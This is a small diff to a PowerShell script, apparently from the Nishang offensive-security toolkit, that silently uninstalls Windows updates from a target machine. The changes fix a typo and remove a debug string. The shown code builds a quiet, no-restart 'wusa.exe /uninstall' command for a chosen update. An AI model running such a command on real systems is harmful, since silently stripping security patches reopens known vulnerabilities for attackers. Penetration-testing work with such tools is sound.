@@ -3,7 +3,7 @@
 Nishang Payload which silently removes updates for a target machine.
 
 .DESCRIPTION
-This payload removes updates from a tagret machine. This could be 
+This payload removes updates from a target machine. This could be 
 used to remove all updates, all security updates or a particular update.
 
 .PARAMETER KBID
@@ -39,7 +39,7 @@ foreach ($HotFix in $HotFixes)
 
     if ($KBID -eq $HotFix.HotfixId)
     {
-        "Inside first if"
+        
         $KBID = $HotFix.HotfixId.Replace("KB", "") 
         $RemovalCommand = "wusa.exe /uninstall /kb:$KBID /quiet /norestart"
         Write-Host "Removing $KBID from the target."
